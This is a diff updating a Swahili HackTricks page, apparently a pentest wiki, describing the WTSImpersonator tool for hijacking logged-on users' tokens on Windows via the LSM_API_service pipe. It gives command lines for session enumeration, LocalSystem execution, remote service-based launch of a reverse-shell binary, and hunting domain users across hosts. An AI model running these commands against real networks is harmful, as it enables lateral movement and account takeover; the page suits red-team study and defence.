@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**WTS Impersonator** tool hutumia **"\\pipe\LSM_API_service"** RPC Named pipe kwa siri kuorodhesha watumiaji walioingia na kuteka nyara token zao, huku ikipita mbinu za jadi za Token Impersonation. Mbinu hii hurahisisha lateral movements bila usumbufu ndani ya mitandao. Ubunifu wa mbinu hii unatambuliwa kwa **Omri Baso, ambaye kazi yake inapatikana kwenye [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>
+**WTSImpersonator**, na Omri Baso, hutumia Windows Terminal Services APIs zinazofichuliwa kupitia named pipe ya RPC `\\pipe\LSM_API_service` ili kuorodhesha sessions za watumiaji walioingia na kuanzisha process kwa kutumia token ya mtumiaji aliyechaguliwa. Inasaidia kuorodhesha na kutekeleza locally, pamoja na workflows za remote zinazotegemea service.<sup>[[1]](#references)</sup>
 
-### Utendaji Mkuu
+## Utendaji wa msingi
 
-Tool hii hufanya kazi kupitia mfuatano wa API calls:
-```bash
+Mtiririko wake wa local execution hutumia mfuatano ufuatao wa API:<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Moduli Muhimu na Matumizi
+## Modules na matumizi
 
-- **Enumerating Users**: Uhesabuji wa watumiaji wa ndani na wa mbali unawezekana kwa kutumia tool hii, kwa kutumia commands za kila hali:
+- **Kuhesabu users:** Tool inaweza kuhesabu sessions kwenye host ya ndani au ya mbali.
 
-- Ndani:
+- Kwenye host ya ndani:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Kwa mbali, kwa kubainisha anwani ya IP au hostname:
+- Kwenye host ya mbali, bainisha anwani ya IP au hostname:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Executing Commands**: Moduli za `exec` na `exec-remote` zinahitaji **Service** context ili kufanya kazi. Utekelezaji wa ndani unahitaji tu executable ya WTSImpersonator na command:
+- **Kutekeleza commands:** Modules za `exec` na `exec-remote` zinahitaji service context. Microsoft inaeleza kuwa `WTSQueryUserToken` inahitaji caller kuendeshwa kama `LocalSystem` akiwa na privilege ya `SE_TCB_NAME`.<sup>[[2]](#references)</sup>
 
-- Mfano wa utekelezaji wa command wa ndani:
+- Utekelezaji wa command kwenye host ya ndani:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe inaweza kutumika kupata service context:
+- PsExec inaweza kuanzisha command prompt ya `LocalSystem` kwa ajili ya testing:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Remote Command Execution**: Inahusisha kuunda na kusakinisha service kwa mbali, sawa na PsExec.exe, ili kuruhusu utekelezaji wenye permissions zinazofaa.
+- **Utekelezaji wa command kwenye host ya mbali:** Mode ya remote huunda service kwenye target kwa workflow inayofanana na PsExec, hivyo inahitaji rights za kusakinisha na kuanzisha service hiyo.<sup>[[1]](#references)</sup>
 
-- Mfano wa utekelezaji wa mbali:
+- Mfano:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Module**: Hulenga watumiaji mahususi kwenye mashine nyingi, na kutekeleza code chini ya credentials zao. Hii ni muhimu hasa kwa kulenga Domain Admins walio na local admin rights kwenye mifumo kadhaa.
+- **Kuwasaka users:** Module ya `user-hunter` hutafuta session ya user aliyetajwa kwenye orodha ya hosts na kujaribu kutekeleza program iliyotolewa katika context hiyo.<sup>[[1]](#references)</sup>
 - Mfano wa matumizi:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## Marejeo
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: function ya `WTSQueryUserToken`](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
